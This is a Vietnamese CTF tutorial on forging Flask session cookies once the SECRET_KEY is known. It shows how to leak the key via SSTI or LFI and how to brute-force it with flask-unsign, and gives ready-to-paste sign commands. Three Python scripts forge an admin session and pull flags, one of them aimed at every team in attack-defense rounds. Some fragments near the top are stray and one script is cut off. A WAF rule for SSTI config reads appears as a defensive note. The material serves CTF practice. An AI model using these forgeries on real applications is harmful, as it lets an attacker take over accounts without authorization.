Session & Cookie Forge

Nhiều framework (đặc biệt Flask) lưu session ngay trong cookie (không lưu ở server), chỉ ký để chống sửa. Nếu bạn tìm ra được khóa ký bí mật (SECRET_KEY) — qua rò rỉ, đoán yếu, hoặc lấy từ 1 lỗ hổng khác (SSTI, LFI) — bạn tự "giả mạo" được session bất kỳ, kể cả của admin, mà không cần mật khẩu.

Session Forge là gì, để làm gì?

Flask (và một số framework khác) mặc định lưu toàn bộ session ngay trong cookie phía trình duyệt (khác với kiểu session truyền thống chỉ lưu 1 ID ngắn, dữ liệu thật nằm ở server). Để chống bạn tự sửa cookie, Flask ký nó bằng 1 khóa bí mật (SECRET_KEY) app tự cấu hình. Nếu bạn biết được SECRET_KEY đó (bằng cách nào cũng được — rò rỉ qua lỗi khác, đoán ra, hoặc brute-force nếu yếu), bạn có thể tự tạo 1 cookie session mới hoàn toàn với bất kỳ nội dung nào (vd {"user":"admin","logged_in":true}), ký đúng bằng khóa đó, và server sẽ tin là hợp lệ.

Nếu chỉ nhớ một điều Cookie session Flask có dạng eyJ....XXXX.YYYY (giống cấu trúc JWT nhưng KHÔNG phải JWT — đây là định dạng riêng của thư viện itsdangerous). Phần đầu là Base64 của dữ liệu (đọc được ngay, không cần khóa) — phần sau là chữ ký. Việc cần làm luôn là: tìm ra SECRET_KEY, rồi tự ký lại dữ liệu bạn muốn.

⚡ SESSION / COOKIE FORGE
🚩 Nhận ra trong 30 giây Cookie tên session có dạng eyJ....XXXXXXXX.YYYYYYYY (2 dấu chấm, phần đầu Base64 decode ra JSON) ⟹ chắc chắn là Flask session (itsdangerous).
✅ Tiền đề cần có Cần biết SECRET_KEY — tìm qua: SSTI ({{config}}, xem bài SSTI), LFI đọc file config, brute-force bằng wordlist (nếu secret yếu kiểu CTF tự dựng), hoặc đôi khi secret mặc định/ví dụ trong docs bị để nguyên.
🔍 Dò nhanh bằng flask-unsign flask-unsign --decode --cookie "eyJ..." — đọc nội dung ngay không cần khóa. flask-unsign --unsign --cookie "eyJ..." --wordlist secrets.txt — brute-force khóa.
💥 Payload dán-chạy-ngay 
# Đã có SECRET_KEY = "supersecret123" -- tự ký cookie admin
flask-unsign --sign --cookie "{'user': 'admin', 'logged_in': True}" --secret "supersecret123"

    {"user": "admin", "logged_in": True})

print(re.search(r"FHACKER2026\{[0-9a-f]{64}\}", r.text).group())

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Server-side session vs Client-side session — kiểu truyền thống: server tự lưu dữ liệu session (trong RAM/database), chỉ gửi cho trình duyệt 1 ID ngắn để tra cứu. Kiểu Flask mặc định: toàn bộ dữ liệu session nằm ngay trong cookie, server không lưu gì cả — chỉ ký để biết cookie chưa bị sửa.
SECRET_KEY — khóa bí mật app Flask dùng để ký (và chỉ để ký, không mã hóa) session cookie. Đây là cấu hình app tự đặt lúc code (app.secret_key = "..."), không phải mật khẩu riêng từng user.
itsdangerous — thư viện Flask dùng để ký/giải ký session, thuật toán mặc định HMAC (giống cơ chế JWT về bản chất — ký bằng khóa đối xứng — nhưng định dạng chuỗi khác JWT).

Code Flask hay viết:

from flask import Flask, session
app = Flask(__name__)
app.secret_key = "dev"   # !! hay bị để yếu/mặc định trong môi trường CTF

@app.route("/login")
def login():
    session["user"] = "guest"
    session["logged_in"] = True
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Ai biết khóa, người đó tự ký được bất cứ gì

Toàn bộ an toàn của cơ chế này phụ thuộc duy nhất vào việc giữ bí mật SECRET_KEY. Khi bạn biết khóa đó (bằng bất kỳ cách nào), bạn có đủ mọi thứ cần để tự ký 1 session mới — về mặt toán học, server không có cách nào phân biệt cookie do chính nó tạo ra với cookie do bạn tự tạo, miễn bạn dùng đúng khóa.

Vấn đề thực tế trong CTF: môi trường dựng nhanh hay để SECRET_KEY yếu (chuỗi ngắn, dễ đoán như "dev", "secret", "changeme") hoặc vô tình để lộ qua 1 lỗ hổng khác (SSTI đọc được biến config toàn cục của Flask, trong đó luôn có SECRET_KEY; hoặc LFI đọc được file source chứa dòng app.secret_key = "...").

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Cấu trúc cookie session Flask

eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJndWVzdCJ9.ZYZ123.AbCdEf1234567890
Phần 1 (eyJsb2dnZWRfaW4i...) — Base64 của JSON dữ liệu session, vd {"logged_in":true,"user":"guest"}. Ai cũng decode được, không cần khóa.
Phần 2 (ZYZ123) — timestamp (thời điểm ký), dùng để kiểm tra hết hạn.
Phần 3 (AbCdEf1234567890) — chữ ký HMAC, tính từ phần 1+2 và SECRET_KEY. Đây là phần duy nhất cần biết khóa mới tính lại được đúng.
Vì sao giả được: nếu biết SECRET_KEY, bạn tự soạn JSON mới (vd {"logged_in":true,"user":"admin"}), rồi dùng ĐÚNG thuật toán của itsdangerous (không phải tự nghĩ ra thuật toán — dùng chính thư viện Flask, xem mục 06) để tính lại chữ ký cho đúng.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Bước 1-2 — lấy cookie, giải mã xem nội dung

07 / CÔNG CỤ THỰC CHIẾN: FLASK-UNSIGN

Không muốn tự viết code ký cookie? Dùng flask-unsign

flask-unsign — công cụ chuyên dụng: decode cookie (không cần khóa), brute-force khóa bằng wordlist, và ký lại cookie mới khi đã biết khóa — làm cả 3 việc chỉ bằng dòng lệnh, không cần tự import thư viện Flask. Đã cài qua pip install flask-unsign (gói PyPI chính chủ, khác hẳn vụ "commix" giả mạo đã gặp ở bài Command Injection — flask-unsign là công cụ thật, tác giả Lix/shevron, rất phổ biến trong CTF).
# Decode — xem nội dung, không cần biết khóa
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWV9.ZYZ123.AbCdEf"

# Brute-force khóa bằng wordlist có sẵn (thử trước, nếu secret yếu)
flask-unsign --unsign --cookie "eyJ..." --wordlist ~/hoc/CTF/Tools/web/jwt_tool/jwt-common.txt

# Đã có khóa -- tự ký cookie mới với nội dung tùy ý
flask-unsign --sign --cookie "{'user': 'admin', 'logged_in': True}" --secret "khoa_da_tim_duoc"
Tái dùng wordlistWordlist jwt-common.txt của jwt_tool (bài JWT) cũng hợp dùng để brute-force Flask secret — cả hai đều là "đoán chuỗi bí mật ngắn/thông dụng", không cần wordlist riêng.
08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)

Từ tay-gõ-Burp sang script tự động

Cần cài Flaskpip install flask — thư viện itsdangerous đi kèm sẵn khi cài Flask, dùng để tự ký cookie đúng chuẩn mà không cần gọi công cụ ngoài trong script.

(A) Bản thủ công — để HIỂU từng bước

from flask.sessions import SecureCookieSessionInterface
import requests

SECRET = "khoa_da_tim_duoc"

class FakeApp:
    secret_key = SECRET

serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
cookie = serializer.dumps({"user": "admin", "logged_in": True})
print("Cookie giả:", cookie)

(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag

import re, requests
from flask.sessions import SecureCookieSessionInterface

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SECRET = "khoa_da_tim_duoc"

class FakeApp:
    secret_key = SECRET

def exploit_session(host):
    serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
    cookie = serializer.dumps({"user": "admin", "logged_in": True})
    r = requests.get(f"http://{host}/admin", cookies={"session": cookie}, timeout=5)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None

print("FLAG:", exploit_session("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests
from flask.sessions import SecureCookieSessionInterface

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
SECRET = "khoa_da_tim_duoc"   # giống nhau mọi đội vì cùng service, hardcode trong source

class FakeApp:
    secret_key = SECRET

def exploit_session(host):
    try:
        serializer = SecureCookieSessionInterface().get_signing_serializer(FakeApp())
        cookie = serializer.dumps({"user": "admin", "logged_in": True})
        r = requests.get(f"http://{host}/admin", cookies={"session": cookie}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":

10 / PHÒNG THỦ: VIẾT WAF RULE

Chặn đúng payload, không chặn nhầm request thường

Giới hạn thậtWAF không thể "biết" cookie nào là forge vì cookie giả có cấu trúc giống hệt cookie thật (đã ký đúng chuẩn, chỉ khác nội dung). Phòng thủ WAF chỉ hiệu quả ở bước chặn con đường lộ SECRET_KEY, không chặn được bước forge trực tiếp.
Rule (áp cho bài SSTI/LFI liên quan)Khớp gì
\{\{\s*config\s*(\[|\.)Payload SSTI cố tình đọc biến config (nơi SECRET_KEY nằm trong)

Đây là lý do nên vá sớm con đường rò rỉ (SSTI/LFI) thay vì cố chặn trực tiếp bước forge — một khi SECRET_KEY đã lộ ra ngoài (dù chỉ 1 lần), mọi rule WAF sau đó đều vô ích vì đối thủ chỉ cần forge offline, không cần gửi lại payload SSTI/LFI nữa.

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay, từ khai thác SSTI lộ SECRET_KEY tới forge cookie admin bằng flask-unsign.

Gợi ý nếu kẹtNhớ dùng đúng cú pháp dict Python (nháy đơn, True viết hoa chữ cái đầu) khi truyền cho flask-unsign --sign --cookie.

⭐⭐ Đổi 1 biến: không có SSTI, nhưng có LFI đọc được file config.py. Lấy SECRET_KEY qua đường này thay vì SSTI.

Gợi ý nếu kẹtXem bài LFI mục 06 (đọc source bằng php://filter nếu PHP, hoặc trực tiếp nếu Python/LFI tương đương) — tìm dòng gán secret_key.

⭐⭐⭐⭐ Tự nghĩ: app dùng session Flask nhưng field quan trọng là role (không phải logged_in/user). Bạn chỉ xem được cookie của chính mình (role: "user"), không biết chắc field admin tên gì. Thiết kế cách tìm ra chính xác cấu trúc field cần thiết mà không cần đọc source.

Gợi ý nếu kẹtDecode cookie hiện tại bằng flask-unsign trước (không cần biết khóa) — xem TOÀN BỘ field đang có trong session của chính bạn, suy luận field nào liên quan quyền hạn.
